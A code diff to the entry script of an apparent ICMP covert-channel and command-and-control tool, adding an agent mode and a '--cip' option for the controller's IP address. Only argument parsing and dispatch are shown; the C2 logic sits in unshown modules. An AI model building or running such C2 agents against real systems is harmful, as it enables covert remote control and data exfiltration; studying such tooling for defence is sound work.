@@ -4,6 +4,7 @@ import sys
 from lib.icmp_send import icmpSend
 import lib.icmp_receive as icmp_receive
 import lib.icmp_c2_controller as icmp_c2_controller
+import lib.icmp_c2_agent as icmp_c2_agent
 
 from scapy.all import sniff, IP, ICMP
 
@@ -31,6 +32,12 @@ def parseargs() -> argparse.Namespace:
         help="file to send, including the path (only used when sending).",
         required=("-s" in sys.argv or "--send" in sys.argv),
     )
+    parser.add_argument(
+        "--cip",
+        action="store",
+        help="IP address of the controller (only used in agent mode).",
+        required=("-a" in sys.argv or "--agent" in sys.argv),
+    )
 
     return parser.parse_args()
 
@@ -43,8 +50,8 @@ def main(args: argparse.Namespace):
         icmp_receive.listen()
     elif args.controller:
         icmp_c2_controller.start()
-    elif args.icmp_c2_agent:
-        icmp_c2_agent.start()
+    elif args.agent:
+        icmp_c2_agent.start(args.cip)
 
 
 main(parseargs())
